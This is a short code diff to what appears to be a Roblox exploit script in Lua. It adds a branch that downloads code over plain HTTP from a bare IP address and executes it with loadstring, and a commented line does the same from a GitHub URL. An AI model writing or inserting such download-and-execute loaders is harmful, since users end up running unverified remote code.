@@ -21,6 +21,11 @@
 -- }
 -- -- loadstring(game:HttpGet("https://raw.githubusercontent.com/anoy010/amm/refs/heads/main/RoloxService"))()
 
+if getgenv().ScriptType == "EVENT" then
+  loadstring(game:HttpGet("http://192.53.122.224:1011/scripts/ROLOX_EVENT"))()
+  repeat task.wait(1000) until 1 == 2
+end
+
 if not ATConfig then
     game.Players.LocalPlayer:Kick("Config is Missing!")
     task.wait(120)
